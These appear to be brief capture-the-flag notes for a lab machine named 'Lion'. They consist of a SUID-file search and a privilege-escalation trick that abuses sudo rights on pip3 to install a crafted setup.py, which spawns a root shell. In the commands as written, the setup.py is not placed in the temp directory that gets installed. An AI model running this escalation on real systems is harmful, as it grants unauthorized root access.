# Lion


```bash

export IP=10.10.113.241
```









```bash

find / -type f -perm -4000 2>/dev/null

TF=$(mktemp -d)
echo "import os; os.execl('/bin/bash', 'bash', '-c', 'bash <$(tty) >$(tty) 2>$(tty)')" > setup.py
sudo /usr/bin/pip3 install $TF

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
sudo /usr/bin/pip3 install $TF
```